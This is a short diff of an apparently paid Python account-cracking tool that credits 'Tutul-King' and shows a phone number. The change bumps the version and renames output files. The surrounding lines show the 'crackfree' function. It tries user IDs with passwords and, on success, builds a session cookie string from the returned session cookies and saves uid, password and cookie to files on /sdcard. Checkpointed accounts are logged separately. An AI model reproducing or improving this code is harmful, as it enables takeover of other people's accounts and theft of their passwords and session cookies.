@@ -256,7 +256,7 @@ logo ="""
 ╠══[Github                   • \33[1;38mTutul-King ]   ║\33[1;34m   
 ╠══[Whatsapp                 • 01608843956 ]  ║\33[1;35m 
 ╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
-╠══[VERSION                  • 7.2 ]          ║\033[1;35m 
+╠══[VERSION                  • 7.3 ]          ║\033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
@@ -789,11 +789,11 @@ def crackfree(idf,pwv):
                 if 'access_token' in q:j
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Tutulb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Tutulb};{ckkk}"
                 print(f'\r\r\033[38;5;46m[COOKIE]\033[38;5;46m {cookie}')
-                open('/sdcard/SK-TUTUL-FILE-oK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/TUTUL-FILE-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                 ok.append(uid)
                 break
                 print(f"\r\r{M}[Tutul-CP] {uid} | {pas} ")
-                open('/sdcard/SK-TUTUL-FILE-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/TUTUL-FILE-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                 cps.append(uid)
                 
             else:
